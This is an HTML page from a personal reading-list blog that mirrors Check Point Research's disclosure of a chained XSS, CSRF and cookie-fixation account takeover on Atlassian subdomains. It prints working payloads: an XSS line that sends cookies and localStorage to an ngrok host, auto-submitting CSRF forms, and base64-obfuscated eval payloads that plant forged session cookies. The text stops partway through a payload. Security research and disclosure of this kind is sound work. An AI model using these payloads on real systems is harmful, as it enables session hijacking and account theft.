@@ -1,0 +1,585 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"pocket.qiwihui.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="A supply-chain breach: Taking over an Atlassian account - Check Point Research">
+<meta property="og:type" content="article">
+<meta property="og:title" content="A supply-chain breach: Taking over an Atlassian account - Check Point Research">
+<meta property="og:url" content="http://pocket.qiwihui.com/2021/07/01/qiwihui-pocket_readings-1145/index.html">
+<meta property="og:site_name" content="Pocket Readings">
+<meta property="og:description" content="A supply-chain breach: Taking over an Atlassian account - Check Point Research">
+<meta property="og:image" content="https://research.checkpoint.com/wp-content/uploads/2021/06/at-1-1024x286.png">
+<meta property="og:image" content="https://research.checkpoint.com/wp-content/uploads/2021/06/at-2.png">
+<meta property="og:image" content="https://research.checkpoint.com/wp-content/uploads/2021/06/at-3.jpg">
+<meta property="og:image" content="https://research.checkpoint.com/wp-content/uploads/2021/06/at-4.png">
+<meta property="og:image" content="https://research.checkpoint.com/wp-content/uploads/2021/06/at-5.png">
+<meta property="og:image" content="https://research.checkpoint.com/wp-content/uploads/2021/06/at-6.png">
+<meta property="og:image" content="https://research.checkpoint.com/wp-content/uploads/2021/06/at-7.jpg">
+<meta property="og:image" content="https://research.checkpoint.com/wp-content/uploads/2021/06/at-8-1024x299.png">
+<meta property="og:image" content="https://research.checkpoint.com/wp-content/uploads/2021/06/at-9-1024x418.png">
+<meta property="og:image" content="https://research.checkpoint.com/wp-content/uploads/2021/06/at-10-1024x328.jpg">
+<meta property="og:image" content="https://research.checkpoint.com/wp-content/uploads/2021/06/at-11-1024x404.jpg">
+<meta property="og:image" content="https://research.checkpoint.com/wp-content/uploads/2021/06/at-12-1024x576.png">
+<meta property="article:published_time" content="2021-07-01T04:21:14.000Z">
+<meta property="article:modified_time" content="2021-07-21T13:58:31.410Z">
+<meta property="article:author" content="qiwihui">
+<meta property="article:tag" content="fetched">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://research.checkpoint.com/wp-content/uploads/2021/06/at-1-1024x286.png">
+
+<link rel="canonical" href="http://pocket.qiwihui.com/2021/07/01/qiwihui-pocket_readings-1145/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-Hans'
+  };
+</script>
+
+  <title>A supply-chain breach: Taking over an Atlassian account - Check Point Research | Pocket Readings</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Pocket Readings</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">个人阅读清单记录博客</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>Archives</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
+    <link itemprop="mainEntityOfPage" href="http://pocket.qiwihui.com/2021/07/01/qiwihui-pocket_readings-1145/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="qiwihui">
+      <meta itemprop="description" content="个人阅读清单记录博客，并不代表个人观点。">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Pocket Readings">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          A supply-chain breach: Taking over an Atlassian account - Check Point Research
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2021-07-01 04:21:14" itemprop="dateCreated datePublished" datetime="2021-07-01T04:21:14+00:00">2021-07-01</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2021-07-21 13:58:31" itemprop="dateModified" datetime="2021-07-21T13:58:31+00:00">2021-07-21</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/2019%E9%98%85%E8%AF%BB/" itemprop="url" rel="index"><span itemprop="name">2019阅读</span></a>
+                </span>
+            </span>
+
+          
+            <div class="post-description">A supply-chain breach: Taking over an Atlassian account - Check Point Research</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>With more than 130,000 customers globally, and millions of users, the Australian 2002 founded company &ldquo;Atlassian&rdquo; develops products for software developers, project managers and other software related teams that uses the platform for data collaboration and information sharing.<br><br><br><br>Tags: security<br><br><br><br>via Pocket <a href="https://ift.tt/3d9kKBS" target="_blank" rel="noopener">https://ift.tt/3d9kKBS</a> original site<br><br><br><br>July 01, 2021 at 11:26AM</p>
+<h3 id="Comments"><a href="#Comments" class="headerlink" title="Comments"></a>Comments</h3><hr>
+<blockquote>
+<p>from: <a href="https://github.com/qiwihui/pocket_readings/issues/1145#issuecomment-871905503" target="_blank" rel="noopener"><strong>github-actions[bot]</strong></a> on: <strong>7/1/2021</strong></p>
+</blockquote>
+<h2 id="A-supply-chain-breach-Taking-over-an-Atlassian-account-Check-Point-Research"><a href="#A-supply-chain-breach-Taking-over-an-Atlassian-account-Check-Point-Research" class="headerlink" title="A supply-chain breach: Taking over an Atlassian account - Check Point Research"></a>A supply-chain breach: Taking over an Atlassian account - Check Point Research</h2><h1 id="A-supply-chain-breach-Taking-over-an-Atlassian-account"><a href="#A-supply-chain-breach-Taking-over-an-Atlassian-account" class="headerlink" title="A supply-chain breach: Taking over an Atlassian account"></a>A supply-chain breach: Taking over an Atlassian account</h1><p>June 24, 2021</p>
+<p>Research By: Dikla Barda, Yaara Shriki, Roman Zaikin and Oded Vanunu</p>
+<h1 id="Background"><a href="#Background" class="headerlink" title="Background"></a>Background</h1><p>With more than 180,000 customers globally, and millions of users, the Australian 2002 founded company “Atlassian” develops products for software developers, project managers and other software related teams that uses the platform for data collaboration and information sharing.</p>
+<p>While workforces globally turned to remote work as a result of the outbreak of COVID-19, tools such as the ones offered by Atlassian became more popular and critical for teams while the need for a seamless transition to a new work mode became a global necessity.</p>
+<p>Atlassian, referring to this as “The Rise of Work Anywhere”, conducted a <a href="https://investors.atlassian.com/financials-and-filings/news/news-details/2020/The-Rise-of-Work-Anywhere-New-Atlassian-Research-Uncovers-the-Everyday-Truths-of-Employees-During-the-Pandemic/default.aspx" target="_blank" rel="noopener">research</a> about the nature of remote work during the Pandemic. The study surveyed more than 5,000 participants in Australia, France, Germany, Japan, and the US, and shows how the nuances of modern work have been amplified, demanding a shift in the way organizations manage an increasingly distributed workforce.</p>
+<h1 id="Breaking-on-through-the-Platform"><a href="#Breaking-on-through-the-Platform" class="headerlink" title="Breaking on through the Platform"></a>Breaking on through the Platform</h1><p>On November 16, 2020 Check Point Research (CPR) uncovered chained vulnerabilities that together can be used to take over an account and control some of Atlassian apps connected through SSO, Some of the affected domains are:</p>
+<ul>
+<li>jira.atlassian.com</li>
+<li>confluence.atlassian.com</li>
+<li>getsupport.atlassian.com</li>
+<li>partners.atlassian.com</li>
+<li>developer.atlassian.com</li>
+<li>support.atlassian.com</li>
+<li>training.atlassian.com</li>
+</ul>
+<p>What makes a supply chain attack such as this one so significant is the fact that once the attacker leverages these vulnerabilities and takes over an account, he can plant backdoors that he can use in the future for his attack. This can create a severe damage which will be identified and controlled only much after the damage is done.</p>
+<p><em><strong>Check Point Research responsibly disclosed this information to the Atlassian teams which and a solution was deployed to ensure its users can safely continue to share info on the various platforms</strong></em></p>
+<h1 id="Deep-Dive"><a href="#Deep-Dive" class="headerlink" title="Deep Dive"></a>Deep Dive</h1><p>Atlassian uses SSO (Single Sign-On) to navigate between Atlassian products such as JIRA, Confluence and Partners.</p>
+<p>Atlassian implements various web security measures such as CSP, SameSite “Strict” cookies and HttpOnly cookies. We had to bypass these security methods using a combination of several attack techniques. Overall we were able to achieve Full Account Take-Over.</p>
+<p>First, we had to find a way to inject code into Atlassian – which we used the XSS and CSRF for. Then, using this code injection, we were able to add a new session cookie to the user’s account, and by combining the session fixation vulnerability in Atlassian domains, we were able to take over accounts.</p>
+<p>Let us dive in into the first bug we found:</p>
+<h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><p>The first security issue was found on the subdomain <strong>training.atlassian.com</strong>. The Training platform offers users courses or credits.<br>We noticed that the Content Security Policy (CSP) was configured poorly on this subdomain with ‘unsafe-inline’ and ‘unsafe-eval’ directives which allows script execution. This makes this subdomain a perfect starting point for our research</p>
+<p><a href="https://research.checkpoint.com/2021/a-supply-chain-breach-taking-over-an-atlassian-account/at-1/" target="_blank" rel="noopener"><img src="https://research.checkpoint.com/wp-content/uploads/2021/06/at-1-1024x286.png" alt=""></a></p>
+<p>We examined the request parameters when adding courses and credits to the shopping cart. We found that when the item type is “<strong>training_credit</strong>”, an additional parameter called “<strong>options._training_credit_account</strong>” is added to request. This parameter was found vulnerable to XSS.</p>
+<p><a href="https://research.checkpoint.com/2021/a-supply-chain-breach-taking-over-an-atlassian-account/at-2/" target="_blank" rel="noopener"><img src="https://research.checkpoint.com/wp-content/uploads/2021/06/at-2.png" alt=""></a></p>
+<p>Let’s test a simple payload to receive all of the user’s cookies and local storage:</p>
+<p><strong><code>&quot;&gt;&lt;svg/onload=&quot;window.location.href=`//7a4389292a5d.ngrok.io?l=${JSON.stringify(localStorage)}&amp;c=${document.cookie}`&quot;&gt;</code></strong></p>
+<p><strong>It works!</strong></p>
+<p><a href="https://research.checkpoint.com/2021/a-supply-chain-breach-taking-over-an-atlassian-account/at-3/" target="_blank" rel="noopener"><img src="https://research.checkpoint.com/wp-content/uploads/2021/06/at-3.jpg" alt=""></a></p>
+<p>And we received all the cookies and the local storage of the target:</p>
+<p><a href="https://research.checkpoint.com/2021/a-supply-chain-breach-taking-over-an-atlassian-account/at-4/" target="_blank" rel="noopener"><img src="https://research.checkpoint.com/wp-content/uploads/2021/06/at-4.png" alt=""></a></p>
+<h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><p>Since the Stored XSS can only be run when adding items to the shopping cart, we needed to make the user add a malicious item without their notice. Then, because there is no CSRF token we could perform CSRF attack on the shopping list and execute our payload.</p>
+<p>In order to achieve that, we uploaded the following POC to our servers and sent it to the victim:</p>
+<p><strong><code>&lt;html&gt;</code></strong></p>
+<p> <strong><head></head></strong></p>
+<p> <strong><body onload=”document.forms\[0\].submit()”></strong></p>
+<p> <strong><form method=”post” action=”https://training.atlassian.com/cart”></strong></p>
+<p> <strong><input type=”hidden” name=”itemType” value=’training\_credit’></strong></p>
+<p> <strong><input type=”hidden” name=”itemId” value=’1′></strong></p>
+<p> <strong><input type=”hidden” name=”options.\_quantity” value=’10’></strong></p>
+<p> <strong>&lt;input type=”hidden” name=”options._training_credit_account” value=’”&gt;&lt;svg/onload=”window.location.href=`//7a4389292a5d.ngrok.io?l=${JSON.stringify(localStorage)}&amp;c=${document.cookie}`”&gt;’&gt;</strong></p>
+<p> <strong><input type=”hidden” name=”action” value=’add’></strong></p>
+<p> <strong></form></strong></p>
+<p> <strong></body></strong></p>
+<p><strong></html></strong></p>
+<p>However, some of the cookies related to the session of the victim are set to SameSite “Strict” which means the browser prevents them from being sent to the backend.</p>
+<p>Surprisingly, we found that during the SSO process those missing cookies are completed by the backend which will essentially bypass the SameSite “Strict” for us.</p>
+<h2 id="SameSite-“Strict”-Bypass"><a href="#SameSite-“Strict”-Bypass" class="headerlink" title="SameSite “Strict” Bypass"></a>SameSite “Strict” Bypass</h2><p>We will now describe the SSO flow. We start with the XSS payload from our origin <a href="https://7a4389292a5d.ngrok.io/" target="_blank" rel="noopener">https://7a4389292a5d.ngrok.io</a>:</p>
+<p><a href="https://research.checkpoint.com/2021/a-supply-chain-breach-taking-over-an-atlassian-account/at-5/" target="_blank" rel="noopener"><img src="https://research.checkpoint.com/wp-content/uploads/2021/06/at-5.png" alt=""></a></p>
+<p>During the SSO flow, the user gets redirected several times to different paths, such as: /auth/cart ,login.html, etc. Throughout the redirect process, the user goes through the authentication process, which adds the missing cookies that we needed and were protected by SameSite.<br>Because our payload was Stored XSS it was stored in the database and was added to the Shopping List. Here we can see that the payload was injected successfully into the page:</p>
+<p><a href="https://research.checkpoint.com/2021/a-supply-chain-breach-taking-over-an-atlassian-account/at-6/" target="_blank" rel="noopener"><img src="https://research.checkpoint.com/wp-content/uploads/2021/06/at-6.png" alt=""></a></p>
+<p>And the malicious item was added to the shopping cart:</p>
+<p><a href="https://research.checkpoint.com/2021/a-supply-chain-breach-taking-over-an-atlassian-account/at-7/" target="_blank" rel="noopener"><img src="https://research.checkpoint.com/wp-content/uploads/2021/06/at-7.jpg" alt=""></a></p>
+<p>At this step we bypassed SameSite “Strict” for CSRF and CSP with inline JavaScript.</p>
+<p>However, the more interesting cookie is <strong>JSESSIONID</strong> which is protected by “<strong>HttpOnly</strong>” and we can’t hijack it via JavaScript.</p>
+<p>At this point we can perform actions on behalf of the user but not login to his account. We dived in further into the SSO flow in order to find another flaw in the process.</p>
+<h2 id="HTTPOnly-Bypass-and-Cookie-Fixation"><a href="#HTTPOnly-Bypass-and-Cookie-Fixation" class="headerlink" title="HTTPOnly Bypass and Cookie Fixation"></a>HTTPOnly Bypass and Cookie Fixation</h2><p><strong>What is cookie fixation?</strong></p>
+<p>Cookie Fixation is when an attacker can remotely force the user to use a session cookie known to him, which becomes authenticated.</p>
+<p>Initially, when the user browses to the login page, the server generates a new session cookie with ‘path=/’ flag. That cookie isn’t associated with any account and only after the user passes the authentication process that same cookie will be associated to his account.</p>
+<p>We knew that using the XSS we couldn’t get the user’s session cookie, since it was protected by HTTPOnly flag. Instead, we could create a new forged one. The newly created JSESSION cookie has the same flags as the original, with one major change – the path flag.</p>
+<p>The original path flag is set to the root directory. We were wondering what would happen if we change it to a more a particular path. It turns out that our path will have priority since it is more specific and will be used instead of the original.</p>
+<p>We changed the path to the exact directive we know the user will get redirected to after authentication which causes the backend to authorize our cookie over the original one.</p>
+<p>By using cookie fixation, we bypassed the HTTPOnly and hijacked the user’s Atlassian account. We will demonstrate that on the following subdomains:</p>
+<h3 id="Training-atlassian-com"><a href="#Training-atlassian-com" class="headerlink" title="Training.atlassian.com"></a>Training.atlassian.com</h3><p>We started by navigating to the <strong>training.atlassian.com</strong> URL from a clean browser without any cache to get a new clean <strong>JSESSIONID</strong> cookie.</p>
+<p><a href="https://research.checkpoint.com/2021/a-supply-chain-breach-taking-over-an-atlassian-account/at-8/" target="_blank" rel="noopener"><img src="https://research.checkpoint.com/wp-content/uploads/2021/06/at-8-1024x299.png" alt=""></a></p>
+<p>Now, we have a JSESSIONID without any information in it at the backend. If we will send a request to the user profile page we will be redirected to the login page.</p>
+<p>We will now perform a Cookie Fixation on the target which will force him to use the forged Cookie by using the following steps:</p>
+<p>We start by modifying our payload and adding the following cookie:</p>
+<pre><code>document.cookie = &quot;JSESSIONID= 5B09C73BF13FE923A2E5B4EE0DAD30E3; Domain=training.atlassian.com; Path=</code></pre><p><strong>/auth0</strong>; Secure”</p>
+<p>Note that the original HttpOnly cookie was set for the path “/”, but the new cookie we are setting in the payload is for the path “/auth0”. Browsing to /auth0, there are 2 cookies: the real one and ours. Ours will “win” in this case because it’s more specific.</p>
+<p>We will use the following redirect to trigger the Auth with this cookie instead of the real one. The interesting parameter here is the <strong>“redirect_uri=<a href="https://training.atlassian.com/auth0”" target="_blank" rel="noopener">https://training.atlassian.com/auth0”</a></strong> which will force the authentication for <strong>training.atlassian.com</strong>:</p>
+<p><code>`location.href=&quot;https://atlassianuni-learndot.auth0.com/authorize?`</code><strong>redirect_uri=<a href="https://training.atlassian.com/auth0" target="_blank" rel="noopener">https://training.atlassian.com/auth0</a></strong><code>&amp;client_id=O7FdHY647VvbCTphBGmvfBt2GdgnH7MR&amp;audience=https%3A%2F%2Fatlassianuni-learndot.auth0.com%2Fuserinfo&amp;scope=openid%20profile%20email&amp;response_type=code&amp;state=HxElpPySsrRuKcYbFOlp9QkLZQ7kwDOemX7Dc-5dnlk&quot;</code></p>
+<p>This auth request will associate our cookie to the target account.</p>
+<p><a href="https://research.checkpoint.com/2021/a-supply-chain-breach-taking-over-an-atlassian-account/at-9/" target="_blank" rel="noopener"><img src="https://research.checkpoint.com/wp-content/uploads/2021/06/at-9-1024x418.png" alt=""></a></p>
+<p>So now that we can control the <strong>JSESSIONID</strong>, we combined all of this steps and crafted the following payload:</p>
+<p><code>&lt;html&gt;</code></p>
+<head></head>
+
+<body onload=”document.forms\[0\].submit()”>
+
+<form method=”post” action=”https://training.atlassian.com/cart”>
+
+<input type=”hidden” name=”itemType” value=’training\_credit’>
+
+<input type=”hidden” name=”itemId” value=’1′>
+
+<input type=”hidden” name=”options.\_quantity” value=’10’>
+
+<p>&lt;input type=”hidden” name=”options._training_credit_account” value=’”&gt;&lt;svg/onload=”eval(atob`ZG9jdW1lbnQuY29va2llPSJKU0VTU0lPTklEPTVCMDlDNzNCRjEzRkU5MjNBMkU1QjRFRTBEQUQzMEUzOyBEb21haW49dHJhaW5pbmcuYXRsYXNzaWFuLmNvbTsgUGF0aD0vYXV0aDA7IFNlY3VyZSI7IHNldFRpbWVvdXQoZnVuY3Rpb24oKXsgbG9jYXRpb24uaHJlZj0iaHR0cHM6Ly9hdGxhc3NpYW51bmktbGVhcm5kb3QuYXV0aDAuY29tL2F1dGhvcml6ZT9yZWRpcmVjdF91cmk9aHR0cHM6Ly90cmFpbmluZy5hdGxhc3NpYW4uY29tL2F1dGgwJmNsaWVudF9pZD1PN0ZkSFk2NDdWdmJDVHBoQkdtdmZCdDJHZGduSDdNUiZhdWRpZW5jZT1odHRwcyUzQSUyRiUyRmF0bGFzc2lhbnVuaS1sZWFybmRvdC5hdXRoMC5jb20lMkZ1c2VyaW5mbyZzY29wZT1vcGVuaWQlMjBwcm9maWxlJTIwZW1haWwmcmVzcG9uc2VfdHlwZT1jb2RlJnN0YXRlPUh4RWxwUHlTc3JSdUtjWWJGT2xwOVFrTFpRN2t3RE9lbVg3RGMtNWRubGsiIH0sMzAwMCk7`)”&gt;’&gt;</p>
+<input type=”hidden” name=”action” value=’add’>
+
+</form>
+
+</body>
+
+</html>
+
+<p>&lt;!–</p>
+<p>// Payload  Explain</p>
+<p>btoa(‘    document.cookie=”JSESSIONID=5B09C73BF13FE923A2E5B4EE0DAD30E3; Domain=training.atlassian.com; Path=<strong>/auth0</strong>; Secure”; setTimeout(function(){ location.href=”<a href="https://atlassianuni-learndot.auth0.com/authorize?redirect\_uri=https://training.atlassian.com/auth0&amp;client\_id=O7FdHY647VvbCTphBGmvfBt2GdgnH7MR&amp;audience=https%3A%2F%2Fatlassianuni-learndot.auth0.com%2Fuserinfo&amp;scope=openid%20profile%20email&amp;response\_type=code&amp;state=HxElpPySsrRuKcYbFOlp9QkLZQ7kwDOemX7Dc-5dnlk”" target="_blank" rel="noopener">https://atlassianuni-learndot.auth0.com/authorize?redirect\_uri=https://training.atlassian.com/auth0&amp;client\_id=O7FdHY647VvbCTphBGmvfBt2GdgnH7MR&amp;audience=https%3A%2F%2Fatlassianuni-learndot.auth0.com%2Fuserinfo&amp;scope=openid%20profile%20email&amp;response\_type=code&amp;state=HxElpPySsrRuKcYbFOlp9QkLZQ7kwDOemX7Dc-5dnlk”</a> },3000);     ‘);</p>
+<p>–&gt;</p>
+<p>The Cookie Fixation combined with the XSS and CSRF bugs allowed us to perform full Account Take-Over on Atlassian Training Platform.</p>
+<p>With the same flow and Cookie Fixation we can navigate to other Atlassian products, for example, <strong>jira.atlassian.com</strong></p>
+<h3 id="Jira-atlassian-com"><a href="#Jira-atlassian-com" class="headerlink" title="Jira.atlassian.com"></a>Jira.atlassian.com</h3><p>To hijack Jira accounts with the same flow, we first need to create a session cookie to perform Cookie Fixation. We log in to <strong>jira.atlassian.com</strong> and take the following cookies:</p>
+<ul>
+<li>JSESSIONID</li>
+<li>AWSALB</li>
+</ul>
+<p>In order to use these cookies for the Cookie Fixation the attacker needs to sign-out from his account to get clean JSESSIONID. We can verify that the cookie is not associated with any account anymore by sending a request to ViewProfile:</p>
+<p><a href="https://research.checkpoint.com/2021/a-supply-chain-breach-taking-over-an-atlassian-account/at-10/" target="_blank" rel="noopener"><img src="https://research.checkpoint.com/wp-content/uploads/2021/06/at-10-1024x328.jpg" alt=""></a></p>
+<p>Next, we will modify our payload, we will perform the same method as we did in training.atlassian.com:</p>
+<p>document.cookie=”<strong>JSESSIONID</strong>=1672885C3F5E4819DD4EF0BF749E56C9; Domain=.atlassian.com; Path=<strong>/plugins</strong>; Secure;”</p>
+<p>document.cookie=”<strong>AWSALB</strong>=iAv6VKT5tbu/HFJVuu/dTE7R80wQXNjR+0opVbccE0zIadORJVGMZxCUcTIglL3OZ/A54eu/NDNLP5I3zE+WcgGWDHpv17SexjFBc1WYA9moC4wEmPooEE/Uqoo2; Domain=.atlassian.com; Path=/plugins/; Secure;”</p>
+<p>Note that the original HTTPOnly cookie was set for the path “/”, but the new cookie we are setting is for the path “/plugins”. Browsing to /auth0, there are 2 cookies: the real one and ours. Ours will “win” in this case because it’s a path cookie.</p>
+<p>We will use the following redirect to trigger the Auth with this cookie instead of the real one. The interesting parameter here is the <strong>“redirect_uri=<a href="https://jira.atlassian.com/plugins”" target="_blank" rel="noopener">https://jira.atlassian.com/plugins”</a></strong> which will force the authentication for <strong>jira.atlassian.com</strong> and redirect us to /plugins.</p>
+<p>location.href=”<a href="https://auth.atlassian.com/authorize?**redirect\_uri=https://jira.atlassian.com/plugins/servlet/authentication/auth\_plugin\_original\_url%3Dhttps%253A%252F%252Fjira.atlassian.com%252F**&amp;client\_id=QxUVh9tTugoLC5cgY3Vjkz3h1jPSvG9p&amp;scope=openid+email+profile&amp;state=4118f57f-a9d9-4f6d-a1d5-add939762f23&amp;response\_type=code&amp;prompt=none”This" target="_blank" rel="noopener">https://auth.atlassian.com/authorize?**redirect\_uri=https://jira.atlassian.com/plugins/servlet/authentication/auth\_plugin\_original\_url%3Dhttps%253A%252F%252Fjira.atlassian.com%252F**&amp;client\_id=QxUVh9tTugoLC5cgY3Vjkz3h1jPSvG9p&amp;scope=openid+email+profile&amp;state=4118f57f-a9d9-4f6d-a1d5-add939762f23&amp;response\_type=code&amp;prompt=none”This</a> auth request will associate our cookie to the target account.</p>
+<p>As can be seen in the following request, the cookie is now assosiated to the target user (“John Doe” in this case).</p>
+<p><a href="https://research.checkpoint.com/2021/a-supply-chain-breach-taking-over-an-atlassian-account/at-11/" target="_blank" rel="noopener"><img src="https://research.checkpoint.com/wp-content/uploads/2021/06/at-11-1024x404.jpg" alt=""></a></p>
+<p>So now that we can control the <strong>JSESSIONID</strong>, we combined all of this steps and crafted the following payload:</p>
+<p><code>&lt;html&gt;</code></p>
+<head></head>
+
+<body onload=”document.forms\[0\].submit()”>
+
+<form method=”post” action=”https://training.atlassian.com/cart”>
+
+<input type=”hidden” name=”itemType” value=’training\_credit’>
+
+<input type=”hidden” name=”itemId” value=’1′>
+
+<input type=”hidden” name=”options.\_quantity” value=’10’>
+
+<p>&lt;input type=”hidden” name=”options._training_credit_account” value=’”&gt;&lt;svg/onload=”eval(atob`ZG9jdW1lbnQuY29va2llPSJKU0VTU0lPTklEPTE2NzI4ODVDM0Y1RTQ4MTlERDRFRjBCRjc0OUU1NkM5OyBEb21haW49LmF0bGFzc2lhbi5jb207IFBhdGg9L3BsdWdpbnM7IFNlY3VyZTsiOyAgZG9jdW1lbnQuY29va2llPSJBV1NBTEI9aUF2NlZLVDV0YnUvSEZKVnV1L2RURTdSODB3UVhOalIrMG9wVmJjY0UweklhZE9SSlZHTVp4Q1VjVElnbEwzT1ovQTU0ZXUvTkROTFA1STN6RStXY2dHV0RIcHYxN1NleGpGQmMxV1lBOW1vQzR3RW1Qb29FRS9VcW9vMjsgRG9tYWluPS5hdGxhc3NpYW4uY29tOyBQYXRoPS9wbHVnaW5zLzsgU2VjdXJlOyI7ICBzZXRUaW1lb3V0KGZ1bmN0aW9uKCl7IGxvY2F0aW9uLmhyZWY9Imh0dHBzOi8vYXV0aC5hdGxhc3NpYW4uY29tL2F1dGhvcml6ZT9yZWRpcmVjdF91cmk9aHR0cHMlM0ElMkYlMkZqaXJhLmF0bGFzc2lhbi5jb20lMkZwbHVnaW5zJTJGc2VydmxldCUyRmF1dGhlbnRpY2F0aW9uJTNGYXV0aF9wbHVnaW5fb3JpZ2luYWxfdXJsJTNEaHR0cHMlMjUzQSUyNTJGJTI1MkZqaXJhLmF0bGFzc2lhbi5jb20lMjUyRiZjbGllbnRfaWQ9UXhVVmg5dFR1Z29MQzVjZ1kzVmprejNoMWpQU3ZHOXAmc2NvcGU9b3BlbmlkK2VtYWlsK3Byb2ZpbGUmc3RhdGU9NDExOGY1N2YtYTlkOS00ZjZkLWExZDUtYWRkOTM5NzYyZjIzJnJlc3BvbnNlX3R5cGU9Y29kZSZwcm9tcHQ9bm9uZSIgfSwzMDAwKTs=`);”&gt;’&gt;</p>
+<input type=”hidden” name=”action” value=’add’>
+
+</form>
+
+</body>
+
+</html>
+
+<p>&lt;!–</p>
+<p>// Payload</p>
+<p>btoa(‘</p>
+<p>document.cookie=”JSESSIONID=1672885C3F5E4819DD4EF0BF749E56C9; Domain=.atlassian.com; Path=/plugins; Secure;”;</p>
+<p>document.cookie=”AWSALB=iAv6VKT5tbu/HFJVuu/dTE7R80wQXNjR+0opVbccE0zIadORJVGMZxCUcTIglL3OZ/A54eu/NDNLP5I3zE+WcgGWDHpv17SexjFBc1WYA9moC4wEmPooEE/Uqoo2; Domain=.atlassian.com; Path=/plugins/; Secure;”;</p>
+<p>setTimeout(function(){</p>
